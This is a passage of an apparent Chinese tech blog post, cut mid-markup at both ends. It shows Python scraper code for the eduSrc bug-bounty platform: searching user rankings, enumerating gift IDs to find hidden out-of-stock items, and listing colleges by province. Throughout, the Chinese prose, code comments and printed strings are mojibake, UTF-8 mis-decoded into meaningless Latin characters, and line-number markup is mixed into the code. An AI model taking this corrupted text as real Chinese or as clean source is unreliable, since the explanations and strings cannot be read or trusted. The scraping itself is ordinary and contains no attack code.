class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">global</span> baseUrl, headers</span><br><span class="line">    <span class="keyword">global</span> numStart, expectedGiftNum</span><br><span class="line">    <span class="keyword">global</span> red, green, yellow, blue, end</span><br><span class="line">    red = <span class="string">&#x27;\033[1m\033[31m&#x27;</span></span><br><span class="line">    green = <span class="string">&#x27;\033[1m\033[32m&#x27;</span></span><br><span class="line">    yellow = <span class="string">&#x27;\033[1m\033[33m&#x27;</span></span><br><span class="line">    blue = <span class="string">&#x27;\033[1m\033[34m&#x27;</span></span><br><span class="line">    end = <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;src.sjtu.edu.cn&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    searchFile = <span class="string">&#x27;search.txt&#x27;</span>               <span class="comment"># æŸ¥æ‰¾ç”¨æˆ·åç»“æœ</span></span><br><span class="line">    giftFile = <span class="string">&#x27;gift.txt&#x27;</span>                   <span class="comment"># æŸ¥æ‰¾ç¤¼å“ç»“æœ</span></span><br><span class="line">    baseUrl = <span class="string">&#x27;https://src.sjtu.edu.cn&#x27;</span>     <span class="comment"># æ•™è‚²srcç½‘å€</span></span><br><span class="line">    numStart = <span class="number">1</span>                            <span class="comment"># ç”¨æˆ·åˆ—è¡¨èµ·å§‹é¡µ</span></span><br><span class="line">    expectedGiftNum = <span class="number">150</span>                   <span class="comment"># é¢„è®¡æœ‰å¤šå°‘ä¸ªç¤¼å“ï¼ˆå¯è®¾ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\neduSrcå¹³å°è„šæœ¬ï¼ˆå°å‹æœç´¢è„šæœ¬ï¼‰ â€”â€” by Ztop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\033[1m\033[35m------------åŠŸèƒ½æè¿°---------------\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;1.æ ¹æ®ç”¨æˆ·åæœç´¢ç”¨æˆ·ä¿¡æ¯ï¼ˆç²¾ç¡®ã€æ¨¡ç³Šï¼‰\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;2.æœç´¢å¹³å°æœªä¸‹æ¶ç¤¼å“\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;3.æœç´¢æŒ‡å®šåŒºåŸŸå†…é«˜æ ¡ä¿¡æ¯\n&#x27;</span></span><br><span class="line">              <span class="string">&#x27;-----------------------------------\033[0m&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ç²¾ç¡®æŸ¥æ‰¾1 | æ¨¡ç³ŠæŸ¥æ‰¾2&#x27;</span>)</span><br><span class="line">            fchoice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> fchoice &gt; <span class="number">0</span> <span class="keyword">and</span> fchoice &lt; <span class="number">3</span>:</span><br><span class="line">                numEnd = get_numEnd(choice)  <span class="comment"># è·å–ç”¨æˆ·åˆ—è¡¨Endé¡µ</span></span><br><span class="line">                <span class="keyword">if</span> fchoice == <span class="number">1</span>:  <span class="comment"># ç²¾ç¡®æŸ¥æ‰¾</span></span><br><span class="line">                    Exact_search(numEnd)</span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># æ¨¡ç³ŠæŸ¥æ‰¾</span></span><br><span class="line">                    Fuzzy_search(searchFile, numEnd)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;%sæœªçŸ¥é€‰é¡¹ï¼%s\n&quot;</span> % (yellow, end))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:  <span class="comment"># æœªä¸‹æ¶ç¤¼å“æœç´¢</span></span><br><span class="line">            gift_search(giftFile)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">3</span>:  <span class="comment"># çœä»½é«˜æ ¡çš„æŸ¥æ‰¾</span></span><br><span class="line">            collegeFind(choice)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%sè¯·é‡æ–°è¾“å…¥%s\n&quot;</span> % (red, end))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>é’ˆå¯¹ç”¨æˆ·</h1><p>æ ¹æ®ç”¨æˆ·åæœç´¢ç”¨æˆ·ä¿¡æ¯ï¼Œè€ƒè™‘åˆ°ä½¿ç”¨è€…å¯¹ç”¨æˆ·åå¯èƒ½çš„ä¸€äº›æƒ…å†µï¼Œç‰¹æ„åŒºåˆ†äº†<code>ç²¾ç¡®æŸ¥è¯¢</code>å’Œ<code>æ¨¡ç³ŠæŸ¥è¯¢</code>ã€‚</p><h2 id="ç²¾ç¡®æŸ¥è¯¢">ç²¾ç¡®æŸ¥è¯¢</h2><p>éå†<code>Xpath</code>è·å–åˆ°çš„æ•°æ®ï¼Œå¯è§†åŒ–è¿›åº¦æ¡ï¼ŒæŸ¥è¯¢åˆ°å³åœæ­¢ï¼Œå¹¶æ˜¾ç¤ºåœ¨æ§åˆ¶å°ï¼Œ<code>ä¸ä¼š</code>ç»§ç»­æœç´¢ã€‚</p><p>æ•ˆæœå›¾å¦‚ä¸‹ğŸ‘‡ï¼ˆå¤ªèœäº†ï¼Œå¸ˆå‚…ä»¬è½»ç‚¹å–·ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img2.3wlk3la5h0y0.jpg" alt="ç²¾ç¡®æŸ¥è¯¢"></p><p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exact_search</span>(<span class="params">numEnd</span>):</span>     <span class="comment"># ç²¾ç¡®æŸ¥æ‰¾ç”¨æˆ·</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        name = <span class="built_in">input</span>(<span class="string">&quot;%sã€ç²¾ç¡®æŸ¥è¯¢ã€‘%s &gt;&gt; å°†æŸ¥æ‰¾çš„ç”¨æˆ·åï¼š&quot;</span>%(yellow, end))</span><br><span class="line">        <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/user/sum/?page=&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%så°†æŸ¥è¯¢é¡µæ•°æ€»å…±ï¼š%s %s&quot;</span> % (blue, numEnd, end))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(numStart, numEnd + <span class="number">1</span>)):</span><br><span class="line">        Surl = url + <span class="built_in">str</span>(i)</span><br><span class="line">        res = requests.get(url=Surl, headers=headers)</span><br><span class="line">        data_html = etree.HTML(res.text)</span><br><span class="line">        name_list = data_html.xpath(<span class="string">&#x27;//div[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[2]/a/text()&#x27;</span>)</span><br><span class="line">        level_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[3]/span/text()&#x27;</span>)</span><br><span class="line">        rank_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            list_name = <span class="built_in">str</span>(name_list[j]).strip()      <span class="comment"># å»å‰åç©ºæ ¼</span></span><br><span class="line">            <span class="keyword">if</span> name == list_name:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n%sã€+ã€‘ç›®æ ‡åœ¨ç¬¬ %s é¡µï¼š%s\tç§°å·ï¼š%s\tæ’åï¼š%s%s\n&quot;</span> % (green, i, name_list[j], level_list[j], rank_list[j], end))</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="æ¨¡ç³ŠæŸ¥è¯¢">æ¨¡ç³ŠæŸ¥è¯¢</h2><div class="note info no-icon flat"><p>è€ƒè™‘åˆ°ä½¿ç”¨è€…å¯¹ç”¨æˆ·åå¯èƒ½å‡ºç°çš„ä¸€äº›æƒ…å†µï¼šå¥å¿˜ã€ç¢ç‰‡è®°å¿†ã€æ‰¾èŒ¬ç­‰ç­‰ï¼ˆbushiï¼‰ï¼Œç‰¹åˆ«è®¾ç½®äº†æ¨¡ç³ŠæŸ¥è¯¢(ä¸»è¦æ˜¯å›é¡¾æ­£åˆ™çš„å­¦ä¹ å˜»å˜»)</p></div><p>æ¨¡ç³ŠæŸ¥è¯¢å¯¹äºä½¿ç”¨è€…è¾“å…¥å­—ç¬¦å¯ä»¥è¿›è¡Œåˆ¤æ–­æ ¡éªŒï¼Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶æœ‰ï¼š</p><ol><li>è‡ªåŠ¨åŒ¹é…ä¸å®Œæ•´å­—ç¬¦è¾“å…¥</li><li>å¯é€‰æ‹©å¿½ç•¥å­—æ¯å¤§å°å†™</li></ol><p>åˆ©ç”¨äº†<code>æ­£åˆ™è¡¨è¾¾å¼</code>å¯¹å…¶è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ç­›é€‰ï¼Œå°†ä½¿ç”¨è€…è¾“å…¥çš„å­—ç¬¦<code>èå…¥</code>åˆ°æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå†å¯¹è·å–åˆ°çš„æ•°æ®è¿›è¡Œ<code>åŒ¹é…</code>ã€‚</p><p>è¿™é‡Œè·å–åˆ°çš„æ•°æ®æ˜¯é€šè¿‡<code>Xpath</code>æå–å‡ºæ¥çš„<code>åˆ—è¡¨</code>ï¼Œå¯é€šè¿‡<code>forå¾ªç¯</code>éå†åˆ—è¡¨å…ƒç´ é€ä¸€è¿›è¡ŒåŒ¹é…ç­›é€‰ã€‚</p><p>æœç´¢åˆ°çš„æ¨¡ç³Šç”¨æˆ·åä¼šå‚¨å­˜åœ¨<code>è‡ªå®šä¹‰æ–‡ä»¶search.txt</code>ä¸­ï¼Œå¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œéå†ç”¨æˆ·ä¸ä¼šä¸­é€”åœæ­¢ï¼Œæœç´¢å®Œæˆåä¼šæ˜¾ç¤ºå…·ä½“çš„<code>æ•°æ®ç»Ÿè®¡ç»“æœ</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;ç”¨æˆ·åï¼š&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¿½ç•¥å­—æ¯å¤§å°å†™</span></span><br><span class="line">result = re.match(<span class="string">&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, è·å–çš„æ•°æ®)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸å¿½ç•¥å­—æ¯å¤§å°å†™</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, re.I) </span><br><span class="line">result = pattern.search( è·å–çš„æ•°æ® )</span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾å¦‚ä¸‹ğŸ‘‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img3.4wsmppzamck0.jpg" alt="æ¨¡ç³ŠæŸ¥è¯¢"></p><p>å…·ä½“è‡ªå®šä¹‰å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fuzzy_search</span>(<span class="params">file, numEnd</span>):</span>     <span class="comment"># æ¨¡ç³ŠæŸ¥æ‰¾ç”¨æˆ·</span></span><br><span class="line">    is_empty(file)    <span class="comment"># åˆ¤æ–­æ–‡ä»¶å†…æ˜¯å¦ä¸ºç©ºã€æœ‰æ•°æ®</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            name = <span class="built_in">input</span>(<span class="string">&quot;%sã€æ¨¡ç³ŠæŸ¥è¯¢ã€‘%s &gt;&gt; å°†æŸ¥æ‰¾çš„ç”¨æˆ·åï¼š&quot;</span>%(yellow, end))</span><br><span class="line">            <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    is_ignoreCase = <span class="built_in">input</span>(<span class="string">&#x27;æ˜¯å¦å¿½ç•¥å­—æ¯å¤§å°å†™(é»˜è®¤)y/nï¼Ÿ&#x27;</span>).lower()</span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/user/sum/?page=&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%så°†æŸ¥è¯¢é¡µæ•°æ€»å…±ï¼š%s \n&quot;</span></span><br><span class="line">          <span class="string">&quot;æ­£åœ¨æœç´¢ï¼Œè¯·è€å¿ƒç­‰å€™(æŸ¥æ‰¾åˆ°çš„ç›¸ä¼¼ç”¨æˆ·åä¼šåœ¨æ–‡ä»¶%så†…è¯¦ç»†æ˜¾ç¤º)...%s&quot;</span> % (blue, numEnd, file, end))</span><br><span class="line">    userNum = <span class="number">0</span>     <span class="comment"># äººæ•°è®°æ•°ï¼ˆé¡ºä¾¿çš„ï¼‰</span></span><br><span class="line">    count = <span class="number">0</span>       <span class="comment"># æŸ¥æ‰¾åˆ°çš„ç±»ä¼¼ç”¨æˆ·æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numStart, numEnd + <span class="number">1</span>):</span><br><span class="line">        Surl = url + <span class="built_in">str</span>(i)</span><br><span class="line">        res_data = requests.get(url=Surl, headers=headers)</span><br><span class="line">        data_html = etree.HTML(res_data.text)</span><br><span class="line">        name_list = data_html.xpath(<span class="string">&#x27;//div[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[2]/a/text()&#x27;</span>)</span><br><span class="line">        level_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[3]/span/text()&#x27;</span>)</span><br><span class="line">        rank_list = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;show_list&quot;]/table/tr[@class=&quot;row&quot;]/td[1]/text()&#x27;</span>)</span><br><span class="line">        rankNum = <span class="number">0</span>  <span class="comment"># è®°æ•°</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> name_list:</span><br><span class="line">            <span class="keyword">if</span> is_ignoreCase == <span class="string">&quot;n&quot;</span>:        <span class="comment"># å¿½ç•¥å­—æ¯å¤§å°å†™</span></span><br><span class="line">                result = re.match(<span class="string">&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, <span class="built_in">str</span>(j))</span><br><span class="line">            <span class="keyword">else</span>:                           <span class="comment"># ä¸å¿½ç•¥å­—æ¯å¤§å°å†™ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">                pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(.*)&#x27;</span> + name + <span class="string">&#x27;(.*)&#x27;</span>, re.I)</span><br><span class="line">                result = pattern.search(<span class="built_in">str</span>(j))</span><br><span class="line">            <span class="comment"># print(j, type(result))</span></span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                findName = result.group()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] ç¬¬ %s%s%s é¡µå‘ç°ç±»ä¼¼ç”¨æˆ·åï¼š%s%s%s&quot;</span> % (green, i, end, green, findName, end))</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="string">&quot;ç¬¬ %s é¡µï¼š\t%s \tç§°å·ï¼š%s\tæ’åï¼š%s\n&quot;</span> % (i, findName, level_list[rankNum], rank_list[rankNum]))</span><br><span class="line">            rankNum += <span class="number">1</span></span><br><span class="line">            userNum += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n%sæŸ¥æ‰¾ç”¨æˆ·äººæ•°å…± %sï¼Œæ€»è®¡å‘ç°äº†%sä¸ªç›¸ä¼¼ç”¨æˆ·å%s\n&quot;</span> % (green, userNum, count, end))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n%så¾ˆé—æ†¾ï¼Œæœªæ‰¾åˆ°ç›¸ä¼¼ç”¨æˆ·å%s\n&quot;</span> % (red, end))</span><br></pre></td></tr></table></figure><h1>é’ˆå¯¹ç¤¼å“</h1><div class="note warning flat"><p>å¹³å°æŸä¸ªç¤¼å“åœ¨æ²¡æœ‰åº“å­˜æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œä¸‹æ¶æ“ä½œï¼Œä½†ä¼šåœ¨å®¢æˆ·ç«¯ä¸­éšè—èµ·æ¥ï¼Œå¯é€šè¿‡urlæŸ¥æ‰¾ã€‚</p></div><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è„šæœ¬æœç´¢åˆ°æ‰€æœ‰ç¤¼å“ï¼ŒåŒ…æ‹¬<code>æ²¡æœ‰åº“å­˜</code>çš„ï¼Œå¹¶è¿›è¡Œä¸€ä¸ªåŒºåˆ†ç»Ÿè®¡ã€‚</p><p>å› ä¸ºä¸çŸ¥é“ç¤¼å“å…·ä½“æœ‰å¤šå°‘ä¸ªï¼Œä¸ºäº†æ–¹ä¾¿è®¾ç½®ï¼Œå°±åœ¨<code>mainå‡½æ•°</code>ä¸­ï¼ŒæŠŠå‚æ•°è®¾ä¸º<code>å…¨å±€</code>å˜é‡<code>expectedGiftNum</code>ï¼Œè¿™é‡Œå¯è‡ªè®¾ä¸€ä¸ªæ•°è¿›è¡Œéå†ï¼ˆæ®è¯´150å¯ä»¥éå†åˆ°æ‰€æœ‰ï¼‰</p><p>æŸ¥è¯¢åˆ°çš„ç¤¼å“è¯¦ç»†ä¿¡æ¯ä¼šä¿å­˜åœ¨<code>è‡ªå®šä¹‰æ–‡ä»¶gift.txt</code>ä¸­ã€‚</p><p>æ•ˆæœå›¾å¦‚ä¸‹ğŸ‘‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img5.4xc4kdfbwow0.jpg" alt="ç¤¼å“æœç´¢"></p><p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift_search</span>(<span class="params">file</span>):</span>      <span class="comment"># æŸ¥è¯¢æœªä¸‹æ¶ç¤¼å“</span></span><br><span class="line">    is_empty(file)      <span class="comment"># åˆ¤æ–­æ–‡ä»¶å†…æ˜¯å¦ä¸ºç©ºã€æœ‰æ•°æ®</span></span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/gift/&#x27;</span></span><br><span class="line">    count = <span class="number">0</span>               <span class="comment"># æœªä¸‹æ¶æ•°é‡</span></span><br><span class="line">    buyNum = <span class="number">0</span>              <span class="comment"># å¯ä¹°æ•°é‡</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%sé¢„è®¡ç¤¼å“æ•°ï¼ˆå¯è®¾ï¼‰ï¼š%s \n&quot;</span></span><br><span class="line">          <span class="string">&quot;æ­£åœ¨æœç´¢ï¼Œè¯·è€å¿ƒç­‰å€™(æŸ¥è¯¢åˆ°çš„ç¤¼å“ä¼šåœ¨æ–‡ä»¶%så†…è¯¦ç»†æ˜¾ç¤º)...%s&quot;</span> % (blue, expectedGiftNum, file, end))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(expectedGiftNum)):</span><br><span class="line">        gift_url = url + <span class="built_in">str</span>(i)</span><br><span class="line">        res = requests.get(url=gift_url, headers=headers)</span><br><span class="line">        html = etree.HTML(res.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Not Found&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment"># print(&#x27;[+]%s success&#x27; % gift_url)</span></span><br><span class="line">            giftName = html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/div[1]/div[2]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            num = html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/div[3]/div[2]/span/strong/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            coins = html.xpath(<span class="string">&#x27;/html/body/div/div/div[1]/div/div/div[2]/div[2]/text()&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(num) != <span class="number">0</span>:</span><br><span class="line">                buyNum += <span class="number">1</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(giftFile, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(gift_url + <span class="string">&quot;\t\tåº“å­˜&quot;</span> + num + <span class="string">&quot;\t\t&quot;</span> + coins + <span class="string">&quot;\t\t&quot;</span> + giftName + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n%så…±æœ‰ï¼š%s ä¸ªæœªä¸‹æ¶ï¼Œ å…¶ä¸­ %s ä¸ªå¯ä¹°ï¼Œ%s ä¸ªå·²æ— åº“å­˜%s\n&quot;</span> % (yellow, count, buyNum, count - buyNum, end))</span><br></pre></td></tr></table></figure><h1>é’ˆå¯¹é«˜æ ¡</h1><p>æœ¬æ¥çš„æƒ³æ³•æ˜¯æƒ³å¼„è¿™ä¸ªæ¨¡å¼çš„äºŒçº§èœå•ï¼š<code>å…¨å›½å†…</code>ã€<code>å„çœä»½</code>ï¼Œä½†å‘ç°ä¸¤ä¸ªä»£ç æœ‰ç‚¹ç±»ä¼¼ï¼Œæ„Ÿè§‰å…¨å›½å†…é‚£ä¸ªå•ç‹¬åˆ†å¼€æœ‰ç‚¹å†—ä½™ï¼Œäºæ˜¯å°±æŠŠå®ƒä»¬åˆåœ¨ä¸€ä¸ªæŸ¥æ‰¾ä¸­ã€‚</p><p>æ•ˆæœå›¾å¦‚ä¸‹ğŸ‘‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img4.2knhfp19ifs0.jpg" alt="é«˜æ ¡æœç´¢"></p><p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collegeFind</span>(<span class="params">choice</span>):</span>      <span class="comment"># å„åŒºåŸŸ/çœä»½æŸ¥æ‰¾</span></span><br><span class="line">    url = baseUrl + <span class="string">&#x27;/rank/firm/&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%sæ­£åœ¨è·å–å„åŒºåŸŸ/çœä»½ä¿¡æ¯....%s&#x27;</span>%(blue, end))</span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    data_html = etree.HTML(res.text)</span><br><span class="line">    provinceList = data_html.xpath(<span class="string">&#x27;//*[@id=&quot;id_province&quot;]/option/text()&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(provinceList)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;provinceList[i]&#125;</span>&#x27;</span>, end=<span class="string">&quot;\t&quot;</span>*<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">6</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="built_in">len</span>(provinceList)-<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span 